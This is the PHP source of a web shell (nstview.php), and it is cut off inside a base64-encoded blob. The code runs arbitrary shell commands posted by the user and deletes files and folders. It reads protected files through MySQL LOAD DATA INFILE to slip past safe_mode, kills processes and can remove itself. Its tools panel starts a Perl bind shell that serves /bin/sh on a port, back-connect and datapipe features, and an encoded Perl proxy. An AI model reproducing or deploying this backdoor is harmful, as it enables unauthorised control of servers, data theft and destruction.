@$p=$_GET['p'];
if(@$_GET['p']=="selfremover"){
        print "<tr><td>";
print "<font color=red face=verdana size=1>Are you sure?<br>
<a href='$php_self?p=yes'>Yes</a> | <a href='$php_self?'>No</a><br>
Remove: <u>";
$path=__FILE__;
print $path;
print " </u>?</td></tr></table>";
die;
}

if($p=="yes"){
$path=__FILE__;
@unlink($path);
$path=str_replace("\\","/",$path);
if(file_exists($path)){$hmm="NOT DELETED!!!";
print "<tr><td><font color=red>FILE $path NOT DELETED</td></tr>";
}else{$hmm="DELETED";}
print "<script>alert('$path $hmm');</script>";

}



if($os=="unix"){
function fastcmd(){
global $fast_commands;
$c_f=explode("\n",$fast_commands);
$c_f=count($c_f)-2;
print "
<form method=post>
Total commands: $c_f<br>
<select name=sh3>";

$c=substr_count($fast_commands," (nst) ");
for($i=0; $i<=$c; $i++){
       $expl2=explode("\r\n",$fast_commands);
        $expl=explode(" (nst) ",$expl2[$i]);
        if(trim($expl[1])!=""){
        print "<option value='".trim($expl[1])."'>$expl[0]</option>\r\n";
   }
}

print "</select><br>
<input type=submit value=Exec>
</form>
";
}
}#end of os unix


if($os=="win"){
function fastcmd(){
global $fast_commands_win;
$c_f=explode("\n",$fast_commands_win);
$c_f=count($c_f)-2;
print "
<form method=post>
Total commands: $c_f<br>
<select name=sh3>";

$c=substr_count($fast_commands_win," (nst) ");
for($i=0; $i<=$c; $i++){
       $expl2=explode("\r\n",$fast_commands_win);
        $expl=explode(" (nst) ",$expl2[$i]);
        if(trim($expl[1])!=""){
        print "<option value='".trim($expl[1])."'>$expl[0]</option>\r\n";
   }
}

print "</select><br>
<input type=submit value=Exec>
</form>
";
}
}#end of os win


echo "
<tr><td>";
if(@$_GET['sh311']=="1"){echo "<center>cmd<br>pwd:
";
chdir($d);
echo getcwd()."<br><br>
Fast cmd:<br>";
fastcmd();
if($os=="win"){$d=str_replace("/","\\\\",$d);}
print "
<a href=\"javascript:cwd('$d ')\">Insert pwd</a>
<form name=sh311Form method=post><input name=sh3 size=110></form></center><br>
";
if(@$_POST['sh3']){
$sh3=$_POST['sh3'];
echo "<pre>";
print `$sh3`;
echo "</pre>";
}
}

if(@$_GET['sh311']=="2"){
echo "<center>cmd<br>
pwd:
";
chdir($d);
echo getcwd()."<br><br>
Fast cmd:<br>";
fastcmd();
if($os=="win"){$d=str_replace("/","\\\\",$d);}
print "
<a href=\"javascript:cwd('$d ')\">Insert pwd</a>
<form name=sh311Form method=post><input name=sh3 size=110></form></center><br>";
if(@$_POST['sh3']){
$sh3=$_POST['sh3'];
echo "<pre>"; print `$sh3`; echo "</pre>";}
echo $copyr;
exit;}

if(@$_GET['delfl']){
@$delfolder=$_GET['delfolder'];
echo "DELETE FOLDER: <font color=red>".@$_GET['delfolder']."</font><br>
(All files must be writable)<br>
<a href='$php_self?deldir=1&dir=".@$delfolder."&rback=".@$_GET['rback']."'>Yes</a> || <a href='$php_self?d=$d'>No</a><br><br>
";
echo $copyr;
exit;
}


$mkdir=$_GET['mkdir'];
if($mkdir){
print "<br><b>Create Folder in $d :</b><br><br>
<form method=post>
New folder name:<br>
<input name=dir_n size=30>
</form><br>
";
if($_POST['dir_n']){
mkdir($d."/".$_POST['dir_n']) or die('Cannot create directory '.$_POST['dir_n']);
print "<b><font color=green>Directory created success!</font></b>";
}
print $copyr;
die;
}


$mkfile=$_GET['mkfile'];
if($mkfile){
print "<br><b>Create file in $d :</b><br><br>
<form method=post>
File name:<br>
(example: hello.txt , hello.php)<br>
<input name=file_n size=30>
</form><br>
";
if($_POST['file_n']){
$fp=fopen($d."/".$_POST['file_n'],"w") or die('Cannot create file '.$_POST['file_n']);
fwrite($fp,"");
print "<b><font color=green>File created success!</font></b>";
}
print $copyr;
die;
}


$ps_table=$_GET['ps_table'];
if($ps_table){

if($_POST['kill_p']){
exec("kill -9 ".$_POST['kill_p']);
}

$str=`ps aux`;

# You can put here preg_match_all for other distrib/os
preg_match_all("/(?:.*?)([0-9]{1,7})(.*?)\s\s\s[0-9]:[0-9][0-9]\s(.*)/i",$str,$matches);


print "<br><b>PS Table :: Fast kill program<br>
(p.s: Tested on Linux slackware 10.0)<br>
<br></b>";
print "<center><table border=1>";
for($i=0; $i<count($matches[3]); $i++){
$expl=explode(" ",$matches[0][$i]);
print "<tr><td>$expl[0]</td><td>PID: ".$matches[1][$i]." :: ".$matches[3][$i]."</td><form method=post><td><font color=red>Kill: <input type=submit name=kill_p value=".trim($matches[1][$i])."></td></form></tr>";
}#end of for
print "</table></center><br><br>";
unset($str);
print $copyr;
die;
}#end of ps table


$read_file_safe_mode=$_GET['read_file_safe_mode'];
if($read_file_safe_mode){

if(!isset($_POST['l'])){$_POST['l']="root";}

print "<br>
Read file content using MySQL - when <b>safe_mode</b>, <b>open_basedir</b> is <font color=green>ON</font><Br>
<form method=post>
<table>
<tr><td>Addr:</td><Td> <input name=serv_ip value='127.0.0.1'><input name=port value='3306' size=6></td></tr>
<tr><td>Login:</td><td><input name=l value=".$_POST['l']."></td></tr>
<tr><td>Passw:</td><td><input name=p value=".$_POST['p']."></td></tr></table>
(example: /etc/hosts)<br>
<input name=read_file size=45><br>
<input type=submit value='Show content'>
</form>
<br>";

if($_POST['read_file']){
$read_file=$_POST['read_file'];
@mysql_connect($_POST['serv_ip'].":".$_POST['port'],$_POST['l'],$_POST['p']) or die("<font color=red>".mysql_error()."</font>");
mysql_create_db("tmp_bd_file") or die("<font color=red>".mysql_error()."</font>");
mysql_select_db("tmp_bd_file") or die("<font color=red>".mysql_error()."</font>");
mysql_query('CREATE TABLE `tmp_file` ( `file` LONGBLOB NOT NULL );') or die("<font color=red>".mysql_error()."</font>");
mysql_query("LOAD DATA INFILE \"".addslashes($read_file)."\" INTO TABLE tmp_file");
$query = "SELECT * FROM tmp_file";
$result = mysql_query($query) or die("<font color=red>".mysql_error()."</font>");
print "<b>File content</b>:<br><br>";
for($i=0;$i<mysql_num_fields($result);$i++){
$name=mysql_field_name($result,$i);}
while($line=mysql_fetch_array($result, MYSQL_ASSOC)){
foreach ($line as $key =>$col_value) {
print htmlspecialchars($col_value)."<br>";}}
mysql_free_result($result);
mysql_drop_db("tmp_bd_file") or die("<font color=red>".mysql_error()."</font>");
}


print $copyr;
die;
}#end of read_file_safe_mode


# sys
$wich_f=$_GET['wich_f'];
$delete=$_GET['delete'];
$del_f=$_GET['del_f'];
$chmod=$_GET['chmod'];
$ccopy_to=$_GET['ccopy_to'];


# delete
if(@$_GET['del_f']){
if(!isset($delete)){
print "<font color=red>Delete this file?</font><br>
<b>$d/$wich_f<br><br></b>
<a href='$php_self?d=$d&del_f=$wich_f&delete=1'>Yes</a> / <a href='$php_self?d=$d'>No</a>
";}
if($delete==1){
unlink($d."/".$del_f);
print "<b>File: <font color=green>$d/$del_f DELETED!</font></b>
<br><b> <a href='$php_self?d=$d'># BACK</a>
";
}
echo $copyr;
exit;
}


# copy to
if($ccopy_to){
$wich_f=$_POST['wich_f'];
$to_f=$_POST['to_f'];
print "<font color=green>Copy file:<br>
$d/$ccopy_to</font><br>
<br>
<form method=post>
File:<br><input name=wich_f size=100 value='$d/$ccopy_to'><br><br>
To:<br><input name=to_f size=100 value='$d/nst_$ccopy_to'><br><br>
<input type=submit value=Copy></form><br><br>
";

if($to_f){
@copy($wich_f,$to_f) or die("<font color=red>Cannot copy!!! maybe folder is not writable</font>");
print "<font color=green><b>Copy success!!!</b></font><br>";
}

echo $copyr;
exit;
}


# chmod
if(@$_GET['chmod']){
$perms = @fileperms($d."/".$wich_f);
print "<b><font color=green>CHMOD file $d/$wich_f</font><br>
<br><center>This file chmod is</b> ";
print perm($perms);
print "</center>
<br>";
$chmd=<<<HTML

<script>
<!--

function do_chmod(user) {
        var field4 = user + "4";
        var field2 = user + "2";
        var field1 = user + "1";
        var total = "t_" + user;
        var symbolic = "sym_" + user;
        var number = 0;
        var sym_string = "";

        if (document.chmod[field4].checked == true) { number += 4; }
        if (document.chmod[field2].checked == true) { number += 2; }
        if (document.chmod[field1].checked == true) { number += 1; }

        if (document.chmod[field4].checked == true) {
                sym_string += "r";
        } else {
                sym_string += "-";
        }
        if (document.chmod[field2].checked == true) {
                sym_string += "w";
        } else {
                sym_string += "-";
        }
        if (document.chmod[field1].checked == true) {
                sym_string += "x";
        } else {
                sym_string += "-";
        }

        if (number == 0) { number = ""; }
        document.chmod[total].value = number;
        document.chmod[symbolic].value = sym_string;

        document.chmod.t_total.value = document.chmod.t_owner.value + document.chmod.t_group.value + document.chmod.t_other.value;
        document.chmod.sym_total.value = "-" + document.chmod.sym_owner.value + document.chmod.sym_group.value + document.chmod.sym_other.value;
}
//-->
</script>



<form name="chmod" method=post>
<p><table cellpadding="0" cellspacing="0" border="0" bgcolor="silver"><tr><td width="100%" valign="top"><table width="100%" cellpadding="5" cellspacing="2" border="0"><tr><td width="100%" bgcolor="#008000" align="center" colspan="5"><font color="#ffffff" size="3"><b>CHMOD (File Permissions)</b></font></td></tr>
        <tr bgcolor="gray">
                <td align="left"><b>Permission</b></td>
                <td align="center"><b>Owner</b></td>
                <td align="center"><b>Group</b></td>
                <td align="center"><b>Other</b></td>
                <td bgcolor="#dddddd" rowspan="4"> </td>
        </tr><tr bgcolor="#dddddd">
                <td align="left" nowrap><b>Read</b></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="owner4" value="4" onclick="do_chmod('owner')"></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="group4" value="4" onclick="do_chmod('group')"></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="other4" value="4" onclick="do_chmod('other')"></td>
        </tr><tr bgcolor="#dddddd">
                <td align="left" nowrap><b>Write</b></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="owner2" value="2" onclick="do_chmod('owner')"></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="group2" value="2" onclick="do_chmod('group')"></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="other2" value="2" onclick="do_chmod('other')"></td>
        </tr><tr bgcolor="#dddddd">
                <td align="left" nowrap><b>Execute</b></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="owner1" value="1" onclick="do_chmod('owner')"></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="group1" value="1" onclick="do_chmod('group')"></td>
                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="other1" value="1" onclick="do_chmod('other')"></td>
        </tr><tr bgcolor="#dddddd">
                <td align="right" nowrap>Octal:</td>
                <td align="center"><input type="text" name="t_owner" value="" size="1"></td>
                <td align="center"><input type="text" name="t_group" value="" size="1"></td>
                <td align="center"><input type="text" name="t_other" value="" size="1"></td>
                <td align="left"><b>=</b> <input type="text" name="t_total" value="777" size="3"></td>
        </tr><tr bgcolor="#dddddd">
                <td align="right" nowrap>Symbolic:</td>
                <td align="center"><input type="text" name="sym_owner" value="" size="3"></td>
                <td align="center"><input type="text" name="sym_group" value="" size="3"></td>
                <td align="center"><input type="text" name="sym_other" value="" size="3"></td>
                <td align="left" width=100><b>=</b> <input type="text" name="sym_total" value="" size="10"></td>
        </tr>
</table></td></tr></table></p>
HTML;

print "<center>".$chmd."

<b>$d/$wich_f</b><br><br>
<input type=submit value=CHMOD></form>
</center>
</form>
";
$t_total=$_POST['t_total'];
if($t_total){
chmod($d."/".$wich_f,$t_total);
print "<center><font color=green><br><b>Now chmod is $t_total</b><br><br></font>";
print "<a href='$php_self?d=$d'># BACK</a><br><br>";
}
echo $copyr;
exit;
}

# rename
if(@$_GET['rename']){
print "<b><font color=green>RENAME $d/$wich_f ?</b></font><br><br>
<center>
<form method=post>
<b>RENAME</b><br><u>$wich_f</u><br><Br><B>TO</B><br>
<input name=rto size=40 value='$wich_f'><br><br>
<input type=submit value=RENAME>
</form>
";

@$rto=$_POST['rto'];

if($rto){
$fr1=$d."/".$wich_f;
$fr1=str_replace("//","/",$fr1);
$to1=$d."/".$rto;
$to1=str_replace("//","/",$to1);

rename($fr1,$to1);
print "File <br><b>$wich_f</b><br>Renamed to <b>$rto</b><br><br>";

echo "<meta http-equiv=\"REFRESH\" content=\"3;URL=".$php_self."?d=".$d."&rename=1&wich_f=".$rto."\">";

}

echo $copyr;
exit;
}




if(@$_GET['deldir']){
@$dir=$_GET['dir'];
function deldir($dir)
{
$handle = @opendir($dir);
while (false!==($ff = @readdir($handle))){
if($ff != "." && $ff != ".."){
if(@is_dir("$dir/$ff")){
deldir("$dir/$ff");
}else{
@unlink("$dir/$ff");
}}}
@closedir($handle);
if(@rmdir($dir)){
@$success = true;}
return @$success;
}
$dir=@$dir;
deldir($dir);

$rback=$_GET['rback'];
@$rback=explode("/",$rback);
$crb=count($rback);
for($i=0; $i<$crb-1; $i++){
        @$x.=$rback[$i]."/";
}
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL='$php_self?d=".@$x."'\">";
echo $copyr;
exit;}


if(@$_GET['t']=="tools"){
        # unix
if($os=="unix"){
print "
<center><br>
<font color=red><b>P.S: After you Start, your browser may stuck! You must close it, and then run nstview.php again.</b><br></font>
<table border=1>
<tr><td align=center><b>[Name]</td><td align=center><b>[C]</td><td align=center><b>[Port]</td><td align=center><b>[Perl]</td><td align=center><b>[Port]</td><td align=center><b>[Other options, info]</td></tr>
<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input type=submit name=c_bd value='Start' style='background-color:green;'></td><td><input name=port size=6 value=5545></td></form><form method=post><td><input type=submit name=perl_bd value='Start' style='background-color:green;'></td><td><input name=port value=5551 size=6></td><td>none</td></form></tr>
<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><input type=submit value='Start' name=bc_c style='background-color:green;'></td><td><input name=port_c size=6 value=5546></td><td><input type=submit value='Start' name=port_p disabled style='background-color:gray;'></td><td><input name=port value=5552 size=6></td><td>b.c. ip: <input name=ip value='".$_SERVER['REMOTE_ADDR']."'> nc -l -p <i>5546</i></td></form></tr>
<tr><form method=post><td><font color=red><b>Datapipe:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port_1 size=6 value=5547></td><td><input type=submit value='Start' name=datapipe_pl style='background-color:green;'></td><td><input name=port_2 value=5553 size=6></td><td>other serv ip: <input name=ip> port: <input name=port_3 value=5051 size=6></td></form></tr>
<tr><form method=post><td><font color=red><b>Web proxy:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5548></td></form><form method=post><td><input type=submit value='Start' name=perl_proxy style='background-color:green;'></td><td><input name=port size=6 value=5554></td></form><td>none</td></tr>
<tr><form method=post><td><font color=red><b>Socks 4 serv:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5549></td></form><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5555></td><td>none</td></tr>
<tr><form method=post><td><font color=red><b>Socks 5 serv:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5550></td></form><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5556></td><td>none</td></tr>
</table>
</center>
<br><Br>
";
}#end of unix


if($_POST['perl_bd']){
$port=$_POST['port'];
$perl_bd_scp = "
use Socket;\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in(\$p,INADDR_ANY));
listen(S,50);while(1){accept(X,S);if(!(\$pid=fork)){if(!defined \$pid){exit(0);}
open STDIN,\"<&X\";open STDOUT,\">&X\";open STDERR,\">&X\";exec(\"/bin/sh -i\");
close X;}}";

if(is_writable("/tmp")){
$fp=fopen("/tmp/nst_perl_bd.pl","w");
fwrite($fp,"$perl_bd_scp");
passthru("nohup perl /tmp/nst_perl_bd.pl &");
unlink("/tmp/nst_perl_bd.pl");
}else{
if(is_writable(".")){
mkdir(".nst_bd_tmp");
$fp=fopen(".nst_bd_tmp/nst_perl_bd.pl","w");
fwrite($fp,"$perl_bd_scp");
passthru("nohup perl .nst_bd_tmp/nst_perl_bd.pl &");
unlink(".nst_bd_tmp/nst_perl_bd.pl");
rmdir(".nst_bd_tmp");
}
}
$show_ps="1";
}#end of start perl_bd

if($_POST['perl_proxy']){
$port=$_POST['port'];
$perl_proxy_scp = "IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4vcGVybA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtIGh0dHAgcHJveHkgc2VydmVyLiB6YXB1c2thamVtOiBwZXJsIHByb3h5LnBsCTgxODEgbHVib2ogcG9ydCB2aTZpIDEwMjQtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KI3JlcXVpcmUgInN5cy9zb2NrZXQucGgiOw0KdXNlIFNvY2tldDsNCnNyYW5kICh0aW1lfHwkJCk7DQojLS0tICBEZWZpbmUgYSBmcmllbmRseSBleGl0IGhhbmRsZXINCiRTSUd7J0tJTEwnfSA9ICRTSUd7UVVJVH0gPSAkU0lHe0lOVH0gPSAnZXhpdF9oYW5kbGVyJzsNCnN1YiBleGl0X2hhbmRsZXIgew0KICAgIHByaW50ICJcblxuIC0tLSBQcm94eSBzZXJ2ZXIgaXMgZHlpbmcgLi4uXG5cbiI7DQogICAgY2xvc2UoU09DS0VUKTsNCiAgICBleGl0Ow0KDQp9DQojLS0tICBTZXR1cCBzb2NrZXQNCg0KJHwgPSAxOw0KJHByb3h5X3BvcnQgPSBzaGlmdChAQVJHVik7DQokcHJveHlfcG9ydCA9IDgxODEgdW5sZXNzICRwcm94eV9wb3J0ID1+IC9cZCsvOw0KDQokc29ja2V0X2Zvcm1hdCA9ICdTIG4gYTQgeDgnOw0KJmxpc3Rlbl90b19wb3J0KFNPQ0tFVCwgJHByb3h5X3BvcnQpOw0KJGxvY2FsX2hvc3QgPSBgaG9zdG5hbWVgOw0KY2hvcCgkbG9jYWxfaG9zdCk7DQokbG9jYWxfaG9zdF9pcCA9IChnZXRob3N0YnluYW1lKCRsb2NhbF9ob3N0KSlbNF07DQpwcmludCAiIC0tLSBQcm94eSBzZXJ2ZXIgcnVubmluZyBvbiAkbG9jYWxfaG9zdCBwb3J0OiAkcHJveHlfcG9ydCBcblxuIjsNCiMtLS0gIExvb3AgZm9yZXZlciB0YWtpbmcgcmVxdWVzdHMgYXMgdGhleSBjb21lDQp3aGlsZSAoMSkgew0KIy0tLSAgV2FpdCBmb3IgcmVxdWVzdA0KICAgIHByaW50ICIgLS0tIFdhaXRpbmcgdG8gYmUgb2Ygc2VydmljZSAuLi5cbiI7DQogICAgKCRhZGRyID0gYWNjZXB0KENISUxELFNPQ0tFVCkpIHx8IGRpZSAiYWNjZXB0ICQhIjsNCiAgICAoJHBvcnQsJGluZXRhZGRyKSA9ICh1bnBhY2soJHNvY2tldF9mb3JtYXQsJGFkZHIpKVsxLDJdOw0KICAgIEBpbmV0YWRkciA9IHVucGFjaygnQzQnLCRpbmV0YWRkcik7DQogICAgcHJpbnQgIkNvbm5lY3Rpb24gZnJvbSAiLCBqb2luKCIuIiwgQGluZXRhZGRyKSwgIiAgcG9ydDogJHBvcnQgXG4iOw0KIy0tLSAgRm9yayBhIHN1YnByb2Nlc3MgdG8gaGFuZGxlIHJlcXVlc3QuDQojLS0tICBQYXJlbnQgcHJvY2VzIGNvbnRpbnVlcyBsaXN0ZW5pbmcuDQogICAgaWYgKGZvcmspIHsNCgl3YWl0OwkJIyBGb3Igbm93IHdlIHdhaXQgZm9yIHRoZSBjaGlsZCB0byBmaW5pc2gNCgluZXh0OwkJIyBXZSB3YWl0IHNvIHRoYXQgcHJpbnRvdXRzIGRvbid0IG1peA0KICAgIH0NCiMtLS0gIFJlYWQgZmlyc3QgbGluZSBvZiByZXF1ZXN0IGFuZCBhbmFseXplIGl0Lg0KIy0tLSAgUmV0dXJuIGFuZCBlZGl0ZWQgdmVyc2lvbiBvZiB0aGUgZmlyc3QgbGluZSBhbmQgdGhlIHJlcXVlc3QgbWV0aG9kLg0KICAgKCRmaXJzdCwkbWV0aG9kKSA9ICZhbmFseXplX3JlcXVlc3Q7DQojLS0tICBTZW5kIHJlcXVlc3QgdG8gcmVtb3RlIGhvc3QNCiAgICBwcmludCBVUkwgJGZpcnN0Ow0KICAgIHByaW50ICRmaXJzdDsNCiAgICB3aGlsZSAoPENISUxEPikgew0KCXByaW50ICRfOw0KCW5leHQgaWYgKC9Qcm94eS1Db25uZWN0aW9uOi8pOw0KCXByaW50IFVSTCAkXzsNCglsYXN0IGlmICgkXyA9fiAvXltcc1x4MDBdKiQvKTsNCiAgICB9DQogICAgaWYgKCRtZXRob2QgZXEgIlBPU1QiKSB7DQoJJGRhdGEgPSA8Q0hJTEQ+Ow0KCXByaW50ICRkYXRhOw0KCXByaW50IFVSTCAkZGF0YTsNCiAgICB9DQogICAgcHJpbnQgVVJMICJcbiI7DQojLS0tICBXYWl0IGZvciByZXNwb25zZSBhbmQgdHJhbnNmZXIgaXQgdG8gcmVxdWVzdG9yLg0KICAgIHByaW50ICIgLS0tIERvbmUgc2VuZGluZy4gUmVzcG9uc2U6IFxuXG4iOw0KICAgICRoZWFkZXIgPSAxOw0KICAgICR0ZXh0ID0gMDsNCiAgICB3aGlsZSAoPFVSTD4pIHsNCglwcmludCBDSElMRCAkXzsNCglpZiAoJGhlYWRlciB8fCAkdGV4dCkgewkgICAgICMgT25seSBwcmludCBoZWFkZXIgJiB0ZXh0IGxpbmVzIHRvIFNURE9VVA0KCSAgICBwcmludCAkXzsNCgkgICAgaWYgKCRoZWFkZXIgJiYgJF8gPX4gL15bXHNceDAwXSokLykgew0KCQkkaGVhZGVyID0gMDsNCgkgICAgfQ0KIwkgICAgaWYgKCRoZWFkZXIgJiYgJF8gPX4gL15Db250ZW50LXR5cGU6IHRleHQvKSB7DQojCQkkdGV4dCA9IDE7DQojCSAgICB9DQoJfQ0KICAgIH0NCiAgICBjbG9zZShVUkwpOw0KICAgIGNsb3NlKENISUxEKTsNCiAgICBleGl0OwkJCSMgRXhpdCBmcm9tIGNoaWxkIHByb2Nlc3MNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0JYW5hbHl6ZV9yZXF1ZXN0CQkJCQkJCS0tDQojLS0JCQkJCQkJCQktLQ0KIy0tCUFuYWx5emUgYSBuZXcgcmVxdWVzdC4gIEZpcnN0IHJlYWQgaW4gZmlyc3QgbGluZSBvZiByZXF1ZXN0LgktLQ0KIy0tCVJlYWQgVVJMIGZyb20gaXQsIHByb2Nlc3MgVVJMIGFuZCBvcGVuIGNvbm5lY3Rpb24uCQktLQ0KIy0tCVJldHVybiBhbiBlZGl0ZWQgdmVyc2lvbiBvZiB0aGUgZmlyc3QgbGluZSBhbmQgdGhlIHJlcXVlc3QJLS0NCiMtLQltZXRob2QuCQkJCQkJCQktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBhbmFseXplX3JlcXVlc3Qgew0KIy0tLSAgUmVhZCBmaXJzdCBsaW5lIG9mIEhUVFAgcmVxdWVzdA0KICAgICRmaXJzdCA9IDxDSElMRD47DQoNCiAgICAkdXJsID0gKCRmaXJzdCA9fiBtfChodHRwOi8vXFMrKXwpWzBdOw0KICAgIHByaW50ICJSZXF1ZXN0IGZvciBVUkw6ICAkdXJsIFxuIjsNCg0KIy0tLSAgQ2hlY2sgaWYgZmlyc3QgbGluZSBpcyBvZiB0aGUgZm9ybSBHRVQgaHR0cDovL2hvc3QtbmFtZSAuLi4NCiAgICAoJG1ldGhvZCwgJHJlbW90ZV9ob3N0LCAkcmVtb3RlX3BvcnQpID0gDQoJKCRmaXJzdCA9fiBtIShHRVR8UE9TVHxIRUFEKSBodHRwOi8vKFteLzpdKyk6PyhcZCopISApOw0KIy0tLSAgSWYgbm90LCBiYWQgcmVxdWVzdC4NCiAgICANCiAgICBpZiAoISRyZW1vdGVfaG9zdCkgew0KCXByaW50ICRmaXJzdDsNCgl3aGlsZSAoPENISUxEPikgew0KCSAgICBwcmludCAkXzsNCgkgICAgbGFzdCBpZiAoJF8gPX4gL15bXHNceDAwXSokLyk7DQoJfQ0KCXByaW50ICJJbnZhbGlkIEhUVFAgcmVxdWVzdCBmcm9tICIsIGpvaW4oIi4iLCBAaW5ldGFkZHIpLCAiXG4iOw0KIwlwcmludCBDSElMRCAiQ29udGVudC10eXBlOiB0ZXh0L3BsYWluIiwiXG5cbiI7DQoJcHJpbnQgQ0hJTEQgIkkgZG9uJ3QgdW5kZXJzdGFuZCB5b3VyIHJlcXVlc3QuXG4iOw0KCWNsb3NlKENISUxEKTsNCglleGl0Ow0KICAgIH0NCiMtLS0gIElmIHJlcXVlc3RlZCBVUkwgaXMgdGhlIHByb3h5IHNlcnZlciB0aGVuIGlnbm9yZSByZXF1ZXN0DQogICAgJHJlbW90ZV9pcCA9IChnZXRob3N0YnluYW1lKCRyZW1vdGVfaG9zdCkpWzRdOw0KICAgIGlmICgoJHJlbW90ZV9pcCBlcSAkbG9jYWxfaG9zdF9pcCkgJiYgKCRyZW1vdGVfcG9ydCBlcSAkcHJveHlfcG9ydCkpIHsNCglwcmludCAkZmlyc3Q7DQoJd2hpbGUgKDxDSElMRD4pIHsNCgkgICAgcHJpbnQgJF87DQoJICAgIGxhc3QgaWYgKCRfID1+IC9eW1xzXHgwMF0qJC8pOw0KCX0NCglwcmludCAiIC0tLSBDb25uZWN0aW9uIHRvIHByb3h5IHNlcnZlciBpZ25vcmVkLlxuIjsNCiMJcHJpbnQgQ0hJTEQgIkNvbnRlbnQtdHlwZTogdGV4dC9wbGFpbiIsIlxuXG4iOw0KCXByaW50IENISUxEICJJdCdzIG5vdCBuaWNlIHRvIG1ha2UgbWUgbG9vcCBvbiBteXNlbGYhLlxuIjsNCgljbG9zZShDSElMRCk7DQoJZXhpdDsNCiAgICB9DQojLS0tICBTZXR1cCBjb25uZWN0aW9uIHRvIHRhcmdldCBob3N0IGFuZCBzZW5kIHJlcXVlc3QNCiAgICAkcmVtb3RlX3BvcnQgPSAiaHR0cCIgdW5sZXNzICgkcmVtb3RlX3BvcnQpOw0KICAgICZvcGVuX2Nvbm5lY3Rpb24oVVJMLCAkcmVtb3RlX2hvc3QsICRyZW1vdGVfcG9ydCk7DQojLS0tICBSZW1vdmUgcmVtb3RlIGhvc3RuYW1lIGZyb20gVVJMDQogICAgICAgICRmaXJzdCA9fiBzL2h0dHA6XC9cL1teXC9dKy8vOw0KICAgICgkZmlyc3QsICRtZXRob2QpOw0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtLQlsaXN0ZW5fdG9fcG9ydChTT0NLRVQsICRwb3J0KQkJCQkJLS0NCiMtLQkJCQkJCQkJCS0tDQojLS0JQ3JlYXRlIGEgc29ja2V0IHRoYXQgbGlzdGVucyB0byBhIHNwZWNpZmljIHBvcnQJCQktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBsaXN0ZW5fdG9fcG9ydCB7DQogICAgbG9jYWwgKCRwb3J0KSA9ICRfWzFdOw0KICAgIGxvY2FsICgkc29ja2V0X2Zvcm1hdCwgJHByb3RvLCAkcGFja2VkX3BvcnQsICRjdXIsICRtYXhfcmVxdWVzdHMpOw0KICAgICRtYXhfcmVxdWVzdHMgPSAzOwkJIyBNYXggbnVtYmVyIG9mIG91dHN0YW5kaW5nIHJlcXVlc3RzDQogICAgJHNvY2tldF9mb3JtYXQgPSAnUyBuIGE0IHg4JzsNCiAgICAkcHJvdG8gPSAoZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKVsyXTsNCiAgICAkcGFja2VkX3BvcnQgPSBwYWNrKCRzb2NrZXRfZm9ybWF0LCAmQUZfSU5FVCwgJHBvcnQsICJcMFwwXDBcMCIpOw0KICAgIHNvY2tldCgkX1swXSwgJlBGX0lORVQsICZTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUgInNvY2tldDogJCEiOw0KICAgIGJpbmQoJF9bMF0sICRwYWNrZWRfcG9ydCkgfHwgZGllICJiaW5kOiAkISI7DQogICAgbGlzdGVuKCRfWzBdLCAkbWF4X3JlcXVlc3RzKSB8fCBkaWUgImxpc3RlbjogJCEiOw0KICAgICRjdXIgPSBzZWxlY3QoJF9bMF0pOyAgDQogICAgJHwgPSAxOwkJCQkjIERpc2FibGUgYnVmZmVyaW5nIG9uIHNvY2tldC4NCiAgICBzZWxlY3QoJGN1cik7DQogICAgfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIy0tCW9wZW5fY29ubmVjdGlvbihTT0NLRVQsICRyZW1vdGVfaG9zdG5hbWUsICRwb3J0KQkJLS0NCiM